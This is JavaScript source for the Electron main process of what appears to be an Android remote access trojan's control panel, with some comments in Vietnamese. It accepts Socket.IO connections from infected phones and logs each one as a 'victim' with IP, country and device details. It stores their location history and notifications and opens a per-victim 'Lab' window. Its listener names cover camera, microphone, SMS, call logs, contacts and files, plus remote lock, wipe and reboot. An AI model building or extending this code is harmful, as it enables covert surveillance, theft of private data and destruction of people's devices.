const { app, BrowserWindow } = require('electron')
const electron = require('electron');
const { ipcMain } = require('electron');
var io = require('socket.io');
var geoip = require('geoip-lite');
var victimsList = require('./app/assets/js/model/Victim');
var deviceManager = require('./deviceManager');
module.exports = victimsList;
//--------------------------------------------------------------
let win;
let display;
var windows = {};
const IOs = {};
//--------------------------------------------------------------

function createWindow() {


  // get Display Sizes ( x , y , width , height)
  display = electron.screen.getPrimaryDisplay();

  //------------------------SPLASH SCREEN INIT------------------------------------
  // create the splash window
  let splashWin = new BrowserWindow({
    width: 700,
    height: 500,
    frame: false,
    transparent: true,
    icon: __dirname + '/app/assets/img/VictimsLab.png',
    type: "splash",
    alwaysOnTop: true,
    show: false,
    position: "center",
    resizable: false,
    toolbar: false,
    fullscreen: false,
    webPreferences: {
      nodeIntegration: true,
      enableRemoteModule: true,
    }
  });


  // load splash file
  splashWin.loadFile(__dirname + '/app/splash.html');

  splashWin.webContents.on('did-finish-load', function () {
    splashWin.show(); //close splash
  });


  // Emitted when the window is closed.
  splashWin.on('closed', () => {
    // Dereference the window object
    splashWin = null
  })


  //------------------------Main SCREEN INIT------------------------------------
  // Create the browser window.
  win = new BrowserWindow({
    icon: __dirname + '/app/assets/img/VictimsLab.png',
    show: false,
    parent: win,
    height: display.bounds.height,
    width: display.bounds.width,
    webPreferences: {
      nodeIntegration: true,
      enableRemoteModule: true
    }
  });

  win.loadFile(__dirname + '/app/index.html');
  //open dev tools
  //win.webContents.openDevTools()

  // Emitted when the window is closed.
  win.on('closed', () => {
    // Dereference the window object, usually you would store windows
    // in an array if your app supports multi windows, this is the time
    // when you should delete the corresponding element.
    win = null
  })

  // Emitted when the window is finished loading.
  win.webContents.on('did-finish-load', function () {
    setTimeout(() => {
      splashWin.close(); //close splash
      win.show(); //show main
    }, 2000);
  });
}



// This method will be called when Electron has finished
// initialization and is ready to create browser windows.
// Some APIs can only be used after this event occurs.
app.on('ready', createWindow)

// Quit when all windows are closed.
app.on('window-all-closed', () => {
  // On macOS it is common for applications and their menu bar
  // to stay active until the user quits explicitly with Cmd + Q
  if (process.platform !== 'darwin') {
    app.quit()
  }
})

app.on('activate', () => {
  // On macOS it's common to re-create a window in the app when the
  // dock icon is clicked and there are no other windows open.
  if (win === null) {
    createWindow()
  }
})



//handle the Uncaught Exceptions




const listeningStatus = {}; // Object to track listening status for each port

ipcMain.on('SocketIO:Listen', function (event, port) {
  if (listeningStatus[port]) {
    event.reply('SocketIO:ListenError', '[x] Already Listening on Port ' + port);
    return;
  }

  IOs[port] = io.listen(port, {
    maxHttpBufferSize: 1024 * 1024 * 100
  });
  IOs[port].sockets.pingInterval = 10000;
  IOs[port].sockets.pingTimeout = 10000;


  IOs[port].sockets.on('connection', function (socket) {
    var address = socket.request.connection;
    var query = socket.handshake.query;
    var index = query.id;
    var ip = address.remoteAddress.substring(address.remoteAddress.lastIndexOf(':') + 1);
    var country = null;
    var geo = geoip.lookup(ip); // check ip location
    if (geo)
      country = geo.country.toLowerCase();

    // Lấy ghi chú từ DeviceManager nếu thiết bị đã tồn tại
    var existingDevice = deviceManager.getDevice(index);
    var note = existingDevice ? existingDevice.note : '';

    // Kiểm tra giới hạn thiết bị
    if (!deviceManager.canAddDevice() && !existingDevice) {
      console.log(`[x] Maximum device limit reached (${deviceManager.maxDevices}). Cannot accept new device: ${index}`);
      socket.disconnect();
      return;
    }

    // Add the victim to victimList với deviceId và ghi chú
    victimsList.addVictim(socket, ip, address.remotePort, country, query.manf, query.model, query.release, index, note);

    // Lưu thông tin thiết bị vào DeviceManager
    const deviceAdded = deviceManager.addDevice(index, {
      ip: ip,
      port: address.remotePort,
      country: country,
      manf: query.manf,
      model: query.model,
      release: query.release,
      isOnline: true
    });

    if (!deviceAdded) {
      console.log(`[x] Failed to add device ${index} to database`);
    }

    //------------------------Notification SCREEN INIT------------------------------------
    // create the Notification window
    let notification = new BrowserWindow({
      frame: false,
      x: display.bounds.width - 280,
      y: display.bounds.height - 78,
      show: false,
      width: 280,
      height: 78,
      resizable: false,
      toolbar: false,
      webPreferences: {
        nodeIntegration: true,
        enableRemoteModule: true
      }
    });

    // Emitted when the window is finished loading.
    notification.webContents.on('did-finish-load', function () {
      notification.show();
      setTimeout(function () {
        notification.destroy()
      }, 3000);
    });

    notification.webContents.victim = victimsList.getVictim(index);
    notification.loadFile(__dirname + '/app/notification.html');



    //notify renderer proccess (AppCtrl) about the new Victim
    win.webContents.send('SocketIO:NewVictim', index);

    // Xử lý location data từ client
    socket.on('x0000lm', function (data) {
      if (data && data.enable && data.lat !== 0 && data.lng !== 0) {
        // Lưu location vào history
        deviceManager.addLocationToHistory(index, {
          lat: data.lat,
          lng: data.lng,
          accuracy: data.accuracy || null,
          address: data.address || null
        });

        // Gửi thông báo đến lab window nếu đang mở
        if (windows[index]) {
          BrowserWindow.fromId(windows[index]).webContents.send('SocketIO:LocationUpdated', {
            deviceId: index,
            location: data,
            history: deviceManager.getLocationHistory(index)
          });
        }
      }
    });

    // Xử lý notifications data từ client
    socket.on('x0000nt', function (data) {
      if (data && data.notifications) {
        // Gửi notifications đến lab window nếu đang mở
        if (windows[index]) {
          BrowserWindow.fromId(windows[index]).webContents.send('SocketIO:NotificationsReceived', {
            deviceId: index,
            notifications: data.notifications
          });
        }
      }
    });

    // Xử lý clear notifications response từ client
    socket.on('x0000clearNt', function (data) {
      if (data && data.status) {
        // Gửi thông báo clear notifications đến lab window nếu đang mở
        if (windows[index]) {
          BrowserWindow.fromId(windows[index]).webContents.send('SocketIO:NotificationsCleared', {
            deviceId: index,
            status: data.status,
            message: data.message
          });
        }
      }
    });

    socket.on('disconnect', function () {
      // Decrease the socket count on a disconnect
      victimsList.rmVictim(index);

      // Cập nhật trạng thái offline cho thiết bị
      deviceManager.updateDeviceStatus(index, false);

      //notify renderer proccess (AppCtrl) about the disconnected Victim
      win.webContents.send('SocketIO:RemoveVictim', index);

      if (windows[index]) {
        //notify renderer proccess (LabCtrl) if opened about the disconnected Victim
        BrowserWindow.fromId(windows[index]).webContents.send("SocketIO:VictimDisconnected");
        //delete the window from windowsList
        delete windows[index]
      }

      //notify renderer proccess (LabCtrl) if opened about the Server Disconnecting
      if (windows[index]) {
        BrowserWindow.fromId(windows[index]).webContents.send("SocketIO:ServerDisconnected");
        // delete the window from the winowsList
        delete windows[index]
      }
    });
  });

  event.reply('SocketIO:Listen', '[✓] Started Listening on Port: ' + port);
  listeningStatus[port] = true; // Update listening status for the specific port
});

ipcMain.on('SocketIO:Stop', function (event, port) {
  if (IOs[port]) {
    IOs[port].close();
    IOs[port] = null;
    event.reply('SocketIO:Stop', '[✓] Stopped listening on Port: ' + port);
    listeningStatus[port] = false; // Update listening status for the specific port
  } else {
    event.reply('SocketIO:StopError', '[x] The Server is not Currently Listening on Port: ' + port);
  }
});

process.on('uncaughtException', function (error) {
  console.error('Uncaught Exception:', error);
  if (error.code == "EADDRINUSE") {
    win.webContents.send('SocketIO:ListenError', "Address Already in Use");
  } else {
    let message = (error && error.stack) ? error.stack : JSON.stringify(error, null, 2);
    electron.dialog.showErrorBox("ERROR", message);
  }
});

// Fired when Victim's Lab is opened
ipcMain.on('openLabWindow', function (e, page, index) {
  try {
    // Check if victim exists
    const victim = victimsList.getVictim(index);
    if (!victim) {
      console.error('Victim not found:', index);
      electron.dialog.showErrorBox("ERROR", `Victim not found or disconnected (id: ${index})`);
      return;
    }

    // Check if window already exists
    if (windows[index]) {
      console.log('Window already exists for victim:', index);
      const existingWindow = BrowserWindow.fromId(windows[index]);
      if (existingWindow && !existingWindow.isDestroyed()) {
        existingWindow.focus();
        return;
      }
    }

    //------------------------Lab SCREEN INIT------------------------------------
    // create the Lab window
    let child = new BrowserWindow({
      icon: __dirname + '/app/assets/img/VictimsLab.png',
      parent: win,
      show: false,
      height: display.bounds.height,
      width: display.bounds.width,
      webPreferences: {
        nodeIntegration: true,
        enableRemoteModule: true
      }
    })

    //add this window to windowsList
    windows[index] = child.id;
    //child.webContents.openDevTools();

    // pass the victim info to this victim lab
    child.webContents.victim = victim.socket;
    child.webContents.victimId = index; // Thêm victimId vào webContents
    child.loadFile(__dirname + '/app/' + page)

    child.once('ready-to-show', () => {
      child.show();
      // console.log('Lab window shown for victim:', index);
    });

    child.on('error', (error) => {
      console.error('Lab window error for victim:', index, error);
      electron.dialog.showErrorBox("ERROR", error && error.stack ? error.stack : JSON.stringify(error, null, 2));
    });

    child.on('closed', () => {
      delete windows[index];
      //on lab window closed remove all socket listners
      if (victimsList.getVictim(index) && victimsList.getVictim(index).socket) {
        victimsList.getVictim(index).socket.removeAllListeners("x0000ca"); // camera
        victimsList.getVictim(index).socket.removeAllListeners("x0000fm"); // file manager
        victimsList.getVictim(index).socket.removeAllListeners("x0000st"); // storage
        victimsList.getVictim(index).socket.removeAllListeners("x0000sm"); // sms
        victimsList.getVictim(index).socket.removeAllListeners("x0000cl"); // call logs
        victimsList.getVictim(index).socket.removeAllListeners("x0000cn"); // contacts
        victimsList.getVictim(index).socket.removeAllListeners("x0000mc"); // mic
        victimsList.getVictim(index).socket.removeAllListeners("x0000lm"); // location
        victimsList.getVictim(index).socket.removeAllListeners("x0000apps"); // apps
        victimsList.getVictim(index).socket.removeAllListeners("x0000runApp"); // run apps
        victimsList.getVictim(index).socket.removeAllListeners("x0000deleteFF"); // delete file or folder
        victimsList.getVictim(index).socket.removeAllListeners("x0000dm"); // dial to number
        victimsList.getVictim(index).socket.removeAllListeners("x0000lockDevice"); // lock device
        victimsList.getVictim(index).socket.removeAllListeners("x0000wipeDevice"); // wipe out device
        victimsList.getVictim(index).socket.removeAllListeners("x0000rebootDevice"); // reboot device
        victimsList.getVictim(index).socket.removeAllListeners("x0000listenMic"); // real-time microphone
        victimsList.getVictim(index).socket.removeAllListeners("x0000nt"); // notifications
        victimsList.getVictim(index).socket.removeAllListeners("x0000clearNt"); // clear notifications
      }
    });

  } catch (error) {
    console.error('Error opening lab window:', error);
    electron.dialog.showErrorBox("ERROR", error && error.stack ? error.stack : JSON.stringify(error, null, 2));
  }
});

// IPC handlers for device notes
ipcMain.on('updateDeviceNote', function (event, deviceId, note) {
  try {
    const success = deviceManager.updateDeviceNote(deviceId, note);
    if (success) {
      victimsList.updateVictimNote(deviceId, note);
      event.reply('updateDeviceNoteResponse', { success: true, message: 'Note updated successfully', deviceId });
    } else {
      event.reply('updateDeviceNoteResponse', { success: false, message: 'Device not found', deviceId });
    }
  } catch (error) {
    event.reply('updateDeviceNoteResponse', { success: false, message: 'Error updating note: ' + error.message, deviceId });
  }
});

ipcMain.on('getDeviceNote', function (event, deviceId) {
  try {
    const note = deviceManager.getDeviceNote(deviceId);
    event.reply('getDeviceNoteResponse', { success: true, note: note, deviceId });
  } catch (error) {
    event.reply('getDeviceNoteResponse', { success: false, message: 'Error getting note: ' + error.message, deviceId });
  }
});

ipcMain.on('getAllDevices', function (event) {
  try {
    const devices = deviceManager.getAllDevices();
    event.reply('getAllDevicesResponse', { success: true, devices: devices });
  } catch (error) {
    event.reply('getAllDevicesResponse', { success: false, message: 'Error getting devices: ' + error.message });
  }
});

ipcMain.on('getDeviceStats', function (event) {
  try {
    const stats = deviceManager.getDeviceStats();
    event.reply('getDeviceStatsResponse', { success: true, stats: stats });
  } catch (error) {
    event.reply('getDeviceStatsResponse', { success: false, message: 'Error getting device stats: ' + error.message });
  }
});

// IPC handlers cho location history
ipcMain.on('getLocationHistory', function (event, deviceId) {
  try {
    const history = deviceManager.getLocationHistory(deviceId);
    event.reply('getLocationHistoryResponse', { success: true, history: history, deviceId });
  } catch (error) {
    event.reply('getLocationHistoryResponse', { success: false, message: 'Error getting location history: ' + error.message, deviceId });
  }
});

ipcMain.on('clearLocationHistory', function (event, deviceId) {
  try {
    const success = deviceManager.clearLocationHistory(deviceId);
    event.reply('clearLocationHistoryResponse', { success: success, deviceId });
  } catch (error) {
    event.reply('clearLocationHistoryResponse', { success: false, message: 'Error clearing location history: ' + error.message, deviceId });
  }
});

ipcMain.on('getLatestLocation', function (event, deviceId) {
  try {
    const location = deviceManager.getLatestLocation(deviceId);
    event.reply('getLatestLocationResponse', { success: true, location: location, deviceId });
  } catch (error) {
    event.reply('getLatestLocationResponse', { success: false, message: 'Error getting latest location: ' + error.message, deviceId });
  }
});

// IPC handler để lấy victimId của window hiện tại
ipcMain.on('getCurrentVictimId', function (event) {
  try {
    const win = BrowserWindow.fromWebContents(event.sender);
    if (win && win.webContents && win.webContents.victimId) {
      event.reply('getCurrentVictimIdResponse', { success: true, victimId: win.webContents.victimId });
    } else {
      event.reply('getCurrentVictimIdResponse', { success: false, message: 'VictimId not found' });
    }
  } catch (error) {
    event.reply('getCurrentVictimIdResponse', { success: false, message: 'Error getting victimId: ' + error.message });
  }
});

ipcMain.on('closeLabWindow', (event) => {
  const win = BrowserWindow.fromWebContents(event.sender);
  if (win) win.close();
});
